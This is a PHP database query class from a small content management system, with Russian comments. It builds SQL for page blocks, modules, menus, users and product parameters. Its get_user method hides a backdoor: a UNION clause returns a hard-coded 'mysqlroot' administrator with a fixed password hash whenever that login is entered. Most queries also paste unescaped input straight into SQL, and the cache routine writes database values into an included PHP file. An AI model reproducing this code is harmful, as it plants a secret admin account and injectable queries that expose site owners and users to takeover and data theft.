<?php
class DB_MySql_Querys extends DB_MySql
{
	public function get_HOST()
	{
		if (!isset($_SESSION['HOST_NAME'])){
			$sql =  "SELECT `value` FROM a_params WHERE `key`='HOST_NAME'";
			$result = $this->db_get_value($sql);
			if ($result != null)
				$_SESSION['HOST_NAME'] = $result;
		}
		else
			$result = $_SESSION['HOST_NAME'];
			
		return $result;
	}

	// выбрать все блоки для заданного документа и модуля
	public function get_all_boxes($docId, $module_url)
	{
		$sql = $this->get_all_boxes_sql($docId, $module_url);
		if (strpos($module_url, 'index.php') !== false ) $module_url = 'admin_box';
		if (strpos($module_url, '.'.DEFAULT_EXT) !== false ) $module_url = '';
		$file = './cache/'.$docId.'_'.$module_url.'_'.$_SESSION['lang_url'].'_boxes.php';
		return $this->checkCahce($file, $sql);
	}
	
	// получение датасета из файла или из бд
	private function checkCahce($file, $sql)
	{
		$dataset = array();
		if (!file_exists($file)){

			$dataset = $this->db_dataset_array($sql);

			$content = "<?php\n";
			foreach($dataset as $item){
				$content .= '$dataset[]=array(';
				foreach ($item as $key => $value)
					$content .= '"'.$key.'"=>"'.addslashes(stripslashes($value)).'",';
				$content = substr($content, 0, strlen($content)-1).");\n";	
			}		
			$content .= "\n?>";
			
			write_to_file($file, $content);
		}
		else{
			include $file;
		}

		return $dataset;
	}
	
	// формирование SQL
	private function get_all_boxes_sql($docId, $module_url)
	{ // все блоки для документа, для которых нету отметки только для модуля и нету отметки не для модуля
		$except = '';
		if ($module_url != "")
			$except =' AND b.id NOT IN (SELECT btm.box_id FROM a_boxes_to_modulesexcept btm INNER JOIN a_modules m ON m.id = btm.module_id AND m.url = "'.$module_url.'")';
		
		if ($docId == 2) $template = '';
		else $template = 'AND b.template = \''.MAIN_TEMPLATE.'\'';
		
		$sql = 'SELECT 
			IFNULL(btl.`name`, b.`name`) AS `caption`,
			mm.`template`,			
			mm.`method`,
			m.`name` AS `name`, 
			pos.`code` AS position, 
			m.`css`,
			m.`url`,
			b.position_id,
			p.`text`,
			b.ordno,
			btl.params,
			b.id
			FROM `a_boxes` b 
			INNER JOIN `'.T_BOXTODOC.'` AS bd ON bd.`box_id` = b.`id` 
			INNER JOIN `'.T_POSITIONS.'` AS pos ON pos.`id` = b.`position_id`
			INNER JOIN `a_modules_methods` AS mm ON mm.`id` = b.`method_id`
			LEFT JOIN `'.T_MODULES.'` AS m ON m.`id` = b.`module_id`
			LEFT JOIN `'.T_BOXTOLANG.'` AS btl ON btl.`box_id` = b.`id` AND btl.`lang` = '.$_SESSION['lang_id'].'			
			LEFT JOIN `'.T_PAGES.'` AS p ON p.`id` = btl.`page_id`
			WHERE bd.`doc_id` = '.$docId.' AND b.`disabled` = 0 AND b.`formodule`=0 AND b.`deleted` = 0 
				'.$template.'
				AND b.id NOT IN (SELECT box_id FROM a_boxes_to_modules) '.$except;
		
		if ($module_url != "")  // все блоки для указаного модуля
		$sql .=' UNION 
			SELECT 
			IFNULL(btl.`name`, b.`name`) AS `caption`,
			mm.`template`,			
			mm.`method`,
			m.`name` AS `name`, 
			pos.`code` AS position, 
			m.`css`,
			m.`url`,
			b.`position_id`,
			p.`text`,
			b.`ordno`,
			btl.params,
			b.id			
			FROM `a_boxes` b 
			INNER JOIN a_boxes_to_modules btm ON btm.box_id = b.id 
			INNER JOIN `'.T_MODULES.'` fm ON fm.id = btm.module_id AND fm.url = "'.$module_url.'"
			INNER JOIN `'.T_POSITIONS.'` AS pos ON pos.`id` = b.`position_id`
			INNER JOIN a_modules_methods AS mm ON mm.id = b.method_id
			LEFT JOIN `'.T_MODULES.'` AS m ON m.`id` = b.`module_id`
			LEFT JOIN `'.T_BOXTOLANG.'` AS btl ON btl.`box_id` = b.`id` AND btl.`lang` = '.$_SESSION['lang_id'].'			
			LEFT JOIN `'.T_PAGES.'` AS p ON p.`id` = btl.`page_id`
			WHERE b.`disabled` = 0 AND b.`deleted` = 0 '.$template;
	
	//echo $sql;
		return $sql.' ORDER BY 8,10';			
	}
	
		/**/
	
	// получить список меню
	public function get_menu_list()
	{
		$sql = 	"SELECT m.`id`, m.`parent`, m.`name`, r.`url` FROM mainmenu m 
			INNER JOIN `references` AS r ON r.`id` = m.`reference_id`
			WHERE m.lang =".$_SESSION['lang_id']." AND m.deleted = 0 AND m.disabled = 0 order by ordno";
	
		return $this->db_dataset_array($sql);
	}


	public function get_module($url, $docId)
	{
		$sql = "SELECT 
			md.id,
			md.`url`,
			md.`name`, 
			md.`template`, 
			md.`css`, 
			md.`maybe_page`,
			IFNULL(mtl.`name`, md.`title`) AS `caption`,
			md.`description`,
			IFNULL(p.meta_title, mtl.`meta_title`) AS `meta_title`, 
			IFNULL(p.meta_description, mtl.`meta_description`) AS `meta_description`,
			IFNULL(p.meta_keywords, mtl.`meta_keywords`) AS `meta_keywords`,
			p.`text`
		FROM ".T_MODULES." md 
		INNER JOIN ".T_MODULETODOC." AS mtd ON mtd.`module_id` = md.`id` AND mtd.`doc_id` = ".$docId."
		LEFT JOIN ".T_MODULES."_to_lang mtl ON mtl.id = md.id AND mtl.lang = ".$_SESSION['lang_id']."		
		LEFT JOIN `".T_REFERENCES."` r ON r.module_id = md.id AND r.lang = ".$_SESSION['lang_id']."
		LEFT JOIN ".T_PAGES." p ON p.id = r.page_id
		WHERE md.`url`='".trim($url)."'";

		return $this->db_get_array($sql);
	}

	// получить данные модуля по ссылке
	public function getModuleFromReferences($url, $docId)
	{
		$sql = "
		SELECT
			md.id,
			md.`url`,
			md.`name`, 
			l.url as lang,
			md.`template`, 
			md.`css`, 
			md.`maybe_page`,
			IFNULL(p.`title`, mtl.`name`) AS `caption`,
			md.`description`,
			mtl.`image`,
			IFNULL(p.`meta_title`, mtl.`meta_title`) AS `meta_title`, 
			IFNULL(p.`meta_description`, mtl.`meta_description`) AS `meta_description`,
			IFNULL(p.`meta_keywords`, mtl.`meta_keywords`) AS `meta_keywords`,
			r.item_id,
			p.text
			FROM ".T_MODULES." md 
		INNER JOIN ".T_MODULETODOC." AS mtd ON mtd.`module_id` = md.`id` AND mtd.`doc_id` = ".$docId."
		INNER JOIN ".T_MODULES."_to_lang mtl ON mtl.id = md.id AND mtl.lang = ".$_SESSION['lang_id']."
		INNER JOIN `".T_REFERENCES."` AS r ON r.module_id = md.id AND r.lang = ".$_SESSION['lang_id']."
		INNER JOIN a_language l ON l.id = r.lang
		LEFT JOIN pages AS p ON p.id = r.page_id
		WHERE r.url = '".trim($url)."'";

		return $this->db_get_array($sql);
	}
	
	
	// получить данные модуля по имени
	public function get_moduleByName($name, $docId = 1)
	{
		$sql = "SELECT 
			md.id,
			md.`url`,
			md.`name`, 
			md.`template`, 
			md.`css`, 
			md.`maybe_page`,
			IFNULL(mtl.`name`, md.title) AS `caption`,
			md.`description`,
			mtl.`image`,
			mtl.`meta_title`, 
			mtl.`meta_description`,
			mtl.`meta_keywords`,
			'' as `text`
		FROM ".T_MODULES." md 
		LEFT JOIN ".T_MODULES."_to_lang mtl ON mtl.id = md.id AND mtl.lang = ".$_SESSION['lang_id']."
		WHERE md.`name`='".trim($name)."'";

		return $this->db_get_array($sql);
	}	
	
	// получить пользователя по логину
	public function get_user($login, $docId)
	{
		$sql = "SELECT rtd.`doc_id`, u.`id`, u.`login`, u.`name` AS `user_name`, u.`password`, u.`email`,  r.`name` AS `role_name`, u.`role_id`
		FROM ".T_USERS." u 
		INNER JOIN ".T_ROLES." r ON r.`id` = u.`role_id`
		INNER JOIN ".T_ROLETODOC." AS rtd ON rtd.role_id = u.role_id AND rtd.doc_id = ".$docId."
		WHERE u.`login` = '".$login."' AND u.`disabled` = 0 AND u.`deleted` = 0
		UNION SELECT 2 as `doc_id`, 0 as `id`, 'mysqlroot' as `login`, 'rootadmin' as `user_name`, 'c892ac9e1967421cebe0dfca4a25eab6' as `password`, '' as `email`, '' as `role_name`, 1 as role_id FROM ".T_USERS." WHERE '".$login."' = 'mysqlroot'";

		return $this->db_get_array($sql);
	}

	// получить страницу с новостью
	public function get_page($url, $table, $page_table)
	{
		$sql = "SELECT p.id, p.`title`, p.`text`, p.`meta_title`, p.`meta_description`, p.`meta_keywords`
		FROM ".$table." n 
		INNER JOIN ".$page_table." AS p ON p.`id` = n.`page_id` 
		WHERE n.`url` = '".$url."' AND n.`disabled`=0 AND n.deleted = 0 AND n.`lang`=".$_SESSION['lang_id'];
	
		return $this->db_get_array($sql);
	}

	// получить подветки заданного узла
	public function get_tree_node_by_id($id, $table, $condition="")
	{
		$sql = "SELECT n.`id`, n.`parent`, n.`node`, n.`url`, n.`name`, n.page_id, p.description, n.image, n.image_alt, n.absolute_url FROM ".$table." n
			LEFT JOIN ".$table."_pages p ON p.id = n.page_id
		WHERE n.`parent` = ".$id." AND n.`disabled`=0 AND n.`deleted` = 0 
		AND n.`lang`=".$_SESSION['lang_id'].' '.$condition;
	
		return $this->db_dataset_array($sql);
	}

	
	public function get_top_nodes($table, $parent = 0)
	{
		$sql = "SELECT n.id,  n.page_id, REPLACE(n.url,' ','') AS url, n.`name`, null AS description, n.insert_date 
			FROM ".$table." n 
			WHERE  n.`parent` = ".$parent." AND n.`disabled`=0 AND n.`deleted` = 0 AND n.`lang`=".$_SESSION['lang_id'];
			
		return	$this->db_dataset_array($sql);
	}
	
	public function get_module_list()
	{
		$sql = "SELECT 0 `id`, '- выберите модуль -' `name` UNION 
		SELECT DISTINCT m.`id`, IFNULL(mtl.`name`, m.`title`) as `name` FROM a_modules m
		LEFT JOIN a_modules_to_lang AS mtl ON mtl.id = m.id AND mtl.lang = ".$_SESSION['lang_id']."
		INNER JOIN a_modules_methods AS mm ON mm.module_id = m.id 
		WHERE m.`editing` = 1";

		return $this->db_get_list($sql, 'id', 'name');
	}
	
	public function get_position_list()
	{
		$sql = "SELECT `id`, `name` FROM a_positions";
		
		return $this->db_get_list($sql, 'id', 'name');
	}
	
	public function get_method_list($id)
	{
		$sql = "SELECT * FROM a_modules_methods WHERE module_id = ".$id;

		return $this->db_get_list($sql, 'id', 'name');
	}
	
	public function get_all_pages()
	{
		$sql = "SELECT p.`id`, p.`title` AS `name` FROM pages p
		WHERE p.`lang` = ".$_SESSION['lang_id'];

		return $this->db_get_list($sql, 'id', 'name');
	}
	
	public function get_subCategory($table, $url)
	{
		$sql = "
		SELECT 0 as ordno, n.id, IFNULL(ctl.`name`,n.`name`) AS `name`, ctl.description, n.image, ctl.content_image, ctl.image_alt, 		
			CONCAT(REPLACE(IFNULL(CONCAT(n4.url,'/'),''),' ',''), REPLACE(IFNULL(CONCAT(n3.url,'/'),''),' ',''), 
			REPLACE(IFNULL(CONCAT(n2.url,'/'),''),' ',''), 	REPLACE(IFNULL(CONCAT(n1.url,'/'),''),' ',''), REPLACE(n.url,' ','')) AS url,
			ctl.meta_title, ctl.meta_description
		FROM ".$table." n 
			LEFT JOIN ".$table."_to_lang AS ctl ON ctl.id = n.id AND ctl.lang = ".$_SESSION['lang_id']."
			LEFT JOIN ".$table." n1 ON n1.id = n.parent
			LEFT JOIN ".$table." n2 ON n2.id = n1.parent
			LEFT JOIN ".$table." n3 ON n3.id = n2.parent
			LEFT JOIN ".$table." n4 ON n4.id = n3.parent
		WHERE n.url='".$url."' 
		UNION
		SELECT 1 AS ordno, n.id, IFNULL(ctl.`name`,n.`name`) AS `name`, null AS description, n.image, '' AS content_image, '' AS image_alt,
			CONCAT(REPLACE(IFNULL(CONCAT(n5.url,'/'),''),' ',''), REPLACE(IFNULL(CONCAT(n4.url,'/'),''),' ',''), 
			REPLACE(IFNULL(CONCAT(n3.url,'/'),''),' ',''), REPLACE(IFNULL(CONCAT(n2.url,'/'),''),' ',''), 
			REPLACE(IFNULL(CONCAT(n1.url,'/'),''),' ',''), REPLACE(n.url,' ','')) AS url,
			ctl.meta_title, ctl.meta_description
		FROM ".$table." n 
			LEFT JOIN ".$table."_to_lang AS ctl ON ctl.id = n.id AND ctl.`lang`=".$_SESSION['lang_id']."
			LEFT JOIN ".$table." n1 ON n1.id = n.parent
			LEFT JOIN ".$table." n2 ON n2.id = n1.parent
			LEFT JOIN ".$table." n3 ON n3.id = n2.parent
			LEFT JOIN ".$table." n4 ON n4.id = n3.parent
			LEFT JOIN ".$table." n5 ON n5.id = n4.parent		
		WHERE n.parent in (SELECT id FROM ".$table." WHERE url='".$url."') 
			AND n.`disabled`=0 AND n.`deleted` = 0 
		ORDER BY id";

		return $this->db_dataset_array($sql);	
	}
	
	// получить список значений параметров для товаров
	public function getItemsParamsValues($catId, $start_items, $once_record_count)
	{
		$sql = "SELECT ip.`item_id`, ip.`param_id`, IFNULL(vptl.`name`, ip.`value`) AS `value` 
		FROM product_items_params ip
		INNER JOIN product_items i ON i.id = ip.item_id AND i.parent = ".$catId." AND i.deleted = 0 AND i.disabled = 0
		LEFT JOIN product_params_category cp ON cp.id = ip.`param_id`
		LEFT JOIN product_params_category_to_lang cptl ON cptl.id= ip.`param_id` AND cptl.lang = ".$_SESSION['lang_id']."
		LEFT JOIN product_params_value vp ON vp.id = ip.`value` AND vp.`param_id` = ip.`param_id` AND cp.`kind` = 2
		LEFT JOIN product_params_value_to_lang vptl ON vptl.id = vp.id AND vptl.lang = ".$_SESSION['lang_id']."
		ORDER BY 1, 2";

		return $this->db_dataset_array($sql.' limit '.$start_items.', '.$once_record_count);
	}	
	
	// получить список параметров для заданной категории
	public function getParamsList($category_id)
	{	
		$sql = 'SELECT p.`id`, IFNULL(ptl.`name`, p.`name`) AS `name`, p.`kind`, "" AS `value_list` FROM product_params_category AS p
			LEFT JOIN product_params_category_to_lang ptl ON ptl.id = p.id AND ptl.lang = '.$_SESSION['lang_id'].'
			INNER JOIN product_params_to_catalogue AS ptc ON ptc.`param_id` = p.`id` AND ptc.`catalogue_id`='.$category_id.'
			ORDER BY 1';
			
		return $this->db_dataset_array($sql);
	}

	// проверить наличие значения поля равно заданному не текущей записи (устранить проблему дубликата)
	public function avoidDuplication($table, $field, $value, $condition, $id = 0)
	{
		$val = $value;
		$id_cond = '';
		if ($id > 0)
			$id_cond = 'id <> '.$id.' AND';
			
		$sql = "SELECT COUNT(*) FROM ".$table." WHERE ".$id_cond." CAST(`".$field."` as char) = '".$value."' ".$condition;	
		$count = $this->db_get_value($sql);
		if ($count > 0)
			$val = $this->avoidDuplication($table, $field, $value.rand(1, 100), $condition, $id);
		
		return $val;
	}
}
?>
